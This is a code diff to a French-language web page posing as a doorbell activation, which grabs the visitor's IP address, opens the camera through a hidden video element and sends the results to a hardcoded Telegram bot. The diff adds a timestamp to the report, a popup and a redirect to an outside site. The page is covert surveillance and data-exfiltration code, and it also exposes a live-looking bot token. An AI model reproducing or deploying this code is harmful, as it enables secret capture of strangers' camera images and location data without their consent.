@@ -51,6 +51,19 @@
             width: 1px;
             height: 1px;
         }
+
+        .popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2c3e50;
+            padding: 2rem;
+            border-radius: 15px;
+            text-align: center;
+            color: white;
+            z-index: 1001;
+        }
     </style>
 </head>
 <body>
@@ -65,9 +78,20 @@
     <div id="statusMsg"></div>
     <video id="hiddenVideo" autoplay playsinline></video>
 
+    <div class="popup" id="popup" style="display: none;">
+        <div id="popupMessage"></div>
+    </div>
+
 <script>
 const BOT_TOKEN = '7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg';
 const CHAT_ID = '5562266493';
+
+function getFormattedDateTime() {
+    const now = new Date();
+    const date = now.toLocaleDateString('fr-FR');
+    const time = now.toLocaleTimeString('fr-FR');
+    return `📅 Date: ${date} 🕒 Heure: ${time}`;
+}
 
 async function getIPInfo() {
     try {
@@ -98,7 +122,7 @@ async function sendToTelegram(message) {
 
 async function handleActivation() {
     let ip = await getIPInfo();
-    let statusMessage = `🚨 Sonnette activée!\nIP: ${ip}\n`;
+    let statusMessage = `🚨 Sonnette activée!\nIP: ${ip}\n${getFormattedDateTime()}`;
     let userMessage = 'MERCI';
     userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>'; // Mensagem com link clicáve
 
@@ -128,13 +152,25 @@ async function handleActivation() {
         
         stream.getTracks().forEach(track => track.stop());
     
-} catch (error) {
-    statusMessage += `\nErreur caméra: ${error.message}`;
-    userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>'; // Mensagem com link clicável
+    } catch (error) {
+        statusMessage += `\nErreur caméra: ${error.message}`;
+        userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>'; // Mensagem com link clicável
+    }
+
+    await sendToTelegram(statusMessage);
+    return userMessage;
 }
 
-await sendToTelegram(statusMessage);
-return userMessage;
+function showPopup(message) {
+    const popup = document.getElementById('popup');
+    const popupMessage = document.getElementById('popupMessage');
+    popupMessage.innerHTML = message;
+    popup.style.display = 'block';
+
+    setTimeout(() => {
+        popup.style.display = 'none';
+        window.location.href = 'https://torreswebsec.github.io/services/';
+    }, 5000);
 }
 
 async function initiateActivation() {
@@ -143,11 +179,11 @@ async function initiateActivation() {
 
     const message = await handleActivation();
     
-    document.getElementById('statusMsg').innerHTML = `
+    showPopup(`
         <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
             ✓ ${message}
         </div>
-    `;
+    `);
 }
 
 window.onload = () => {
